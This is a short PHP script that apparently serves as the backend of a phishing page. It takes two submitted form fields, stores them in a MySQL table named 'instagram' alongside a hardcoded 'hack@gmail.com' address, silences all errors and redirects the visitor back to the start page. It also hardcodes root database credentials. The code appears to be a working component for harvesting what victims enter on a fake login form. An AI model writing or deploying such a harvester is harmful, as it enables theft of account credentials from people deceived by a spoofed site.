<?php
error_reporting(0);

if (isset($_POST['adi'], $_POST['soyadi'])) {

    $adi = trim(filter_input(INPUT_POST, 'adi', FILTER_SANITIZE_STRING));
    $soyadi = trim(filter_input(INPUT_POST, 'soyadi', FILTER_SANITIZE_STRING));
    $eposta = 'hack@gmail.com';

    if (empty($adi) || empty($soyadi) || empty($eposta)) {
        header('Refresh:1; url=index.php');
    }

    if (!filter_var($eposta, FILTER_VALIDATE_EMAIL)) {
        header('Refresh:1; url=index.php');
    }

    $baglanti = new mysqli("localhost", "root", "asd", "bigo");

    if ($baglanti->connect_errno > 0) {
        die("<b>Bağlantı Hatası:</b> " . $baglanti->connect_error);
    }

    $baglanti->set_charset("utf8");

    $sorgu = $baglanti->prepare("INSERT INTO instagram (adi, soyadi,eposta) VALUES(?, ?, ?)");

    $sorgu->bind_param('sss', $adi, $soyadi, $eposta);
    $sorgu->execute();

    if ($baglanti->errno > 0) {
        die("<b>Sorgu Hatası:</b> " . $baglanti->error);
    }

}session_write_close();
header('Refresh:1; url=index.php');

?>
